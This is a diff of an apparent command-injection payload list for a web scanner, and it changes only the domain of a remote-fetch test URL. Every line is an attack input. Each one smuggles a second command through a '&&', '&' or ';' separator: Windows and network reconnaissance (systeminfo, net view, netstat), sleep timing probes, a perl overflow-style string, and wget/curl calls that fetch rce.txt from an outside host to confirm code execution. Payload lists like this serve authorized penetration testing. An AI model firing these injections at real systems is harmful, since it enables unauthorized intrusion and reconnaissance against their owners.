@@ -102,8 +102,8 @@
 && systeminfo
 && net view
 && netstat -an
-&& wget http://xerosecurity.com/rce.txt
-&& curl http://xerosecurity.com/rce.txt
+&& wget http://sn1persecurity.com/rce.txt
+&& curl http://sn1persecurity.com/rce.txt
 && sleep 1
 && sleep 5
 && perl -e 'print "X"x2048'
@@ -141,8 +141,8 @@
 & systeminfo
 & net view
 & netstat -an
-& wget http://xerosecurity.com/rce.txt
-& curl http://xerosecurity.com/rce.txt
+& wget http://sn1persecurity.com/rce.txt
+& curl http://sn1persecurity.com/rce.txt
 & sleep 1
 & sleep 5
 & perl -e 'print "X"x2048'
@@ -180,8 +180,8 @@
 ; systeminfo
 ; net view
 ; netstat -an
-; wget http://xerosecurity.com/rce.txt
-; curl http://xerosecurity.com/rce.txt
+; wget http://sn1persecurity.com/rce.txt
+; curl http://sn1persecurity.com/rce.txt
 ; sleep 1
 ; sleep 5
 ; perl -e 'print "X"x2048'
